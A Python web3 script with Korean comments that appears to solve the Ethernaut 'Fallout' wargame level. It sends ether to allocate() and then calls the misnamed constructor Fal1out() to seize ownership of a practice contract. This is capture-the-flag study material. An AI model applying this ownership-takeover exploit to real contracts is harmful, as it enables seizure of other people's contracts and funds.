from web3 import Web3
import requests
import json

# 풀이
# 1. 트랜잭션 인스턴스 생성 후 allocate 함수를 타겟으로 이더리움 송금하여 allocations[msg.sender] 정보 추가
# 2. 1번 과정 후 Fal1out 함수를 타겟으로 이더리움 송금하여 owner 정보를 msg.sender로 변경
# 3. 페이지에서 Submit Instance 명령어 실행하여 문제 해결 

# 문제에서 사용하는 각종 정보 추출
def parse_env_to_dict(env_file_path):
    env_dict = {}

    # Read the .env file line by line
    with open(env_file_path, "r") as file:
        for line in file:
            # Strip whitespace and ignore comments or empty lines
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Split key and value on the first '='
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()

            # Remove quotes from the value if present
            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
                value = value[1:-1]

            # Add to dictionary
            env_dict[key] = value

    return env_dict

ENV_PATH = "../.env"

dict_output = parse_env_to_dict(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x8aCd85898458400f7Db866d53FCFF6f0D49741FF'
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Seth!")
else:
    print("Failed to connect to Seth.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "function",
        "name": "Fal1out",
        "inputs": [],
        "outputs": [],
        "stateMutability": "payable",
        "payable": True,
        "signature": "0x6fab5ddf"
    },
    {
        "type": "function",
        "name": "allocate",
        "inputs": [],
        "outputs": [],
        "stateMutability": "payable",
        "payable": True,
        "signature": "0xabaa9916"
    },
    {
        "type": "function",
        "name": "allocatorBalance",
        "inputs": [
            {
                "name": "allocator",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xffd40b56"
    },
    {
        "type": "function",
        "name": "collectAllocations",
        "inputs": [],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0x8aa96f38"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address payable"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    },
    {
        "type": "function",
        "name": "sendAllocation",
        "inputs": [
            {
                "name": "allocator",
                "type": "address",
                "internalType": "address payable"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0xa2dea26f"
    }
]

print('---- BEFORE TRANSACTION ----')

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

BEFORE_OWNER = contract.functions.owner().call({'from': USER_ADDRESS})

if BEFORE_OWNER != USER_ADDRESS:
    print("Contract's Owner is not changed!\n")
else:
    print("Contract's Owner is already changed!\n")
    exit(0)

print("1. Send transaction to allocate function for add user allocations information")

# allocate 함수 호출하여 사전 세팅
data = {
    'value': 1,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

# 트랜젝션 서명 및 전송
tx = contract.functions.allocate().build_transaction(data)
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print("2. Send transaction to Fal1out constructor for re-initialize owner address")

# 생성자 호출 및 소유자 변경
data = {
    'from': USER_ADDRESS,
    'value': 1,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

# 트랜젝션 서명 및 전송
tx = contract.functions.Fal1out().build_transaction(data)
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print('---- AFTER TRANSACTION ----')

AFTER_OWNER = contract.functions.owner().call({'from': USER_ADDRESS})

print(f"Contract owner after transaction : {AFTER_OWNER}")

if AFTER_OWNER != USER_ADDRESS:
    print("Contract's Owner has not changed!")
    exit(0)
else:
    print("Contract's Owner has changed!")
